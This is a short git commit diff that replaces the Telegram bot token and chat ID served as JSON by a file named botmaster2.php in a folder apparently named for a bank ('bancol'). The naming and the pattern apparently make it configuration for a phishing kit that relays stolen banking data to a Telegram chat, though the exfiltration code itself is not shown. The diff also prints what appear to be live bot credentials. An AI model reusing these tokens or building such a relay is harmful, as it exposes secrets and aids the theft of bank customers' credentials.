778c44735cb4f07f9067e55078075b483f56edd7
rootsh777 <root.sh777@gmail.com>
2025-06-05 15:05:52 -0500

    Update botmaster2.php

--- dinadatos/bancol/botmaster2.php
+++ dinadatos/bancol/botmaster2.php
@@ -1,7 +1,7 @@
 <?php
 header('Content-Type: application/json');
 echo json_encode([
-    'token' => '7844799050:AAEr7wChEkAp31ktChjaTlguv1aUykSbaxw',
-    'chat_id' => '-1002680744798'
+    'token' => '7850939237:AAEaFGCNLfYjKNEV-qO9eWW1vnvemt97DDk',
+    'chat_id' => '-1002756610878'
 ]);
 ?>
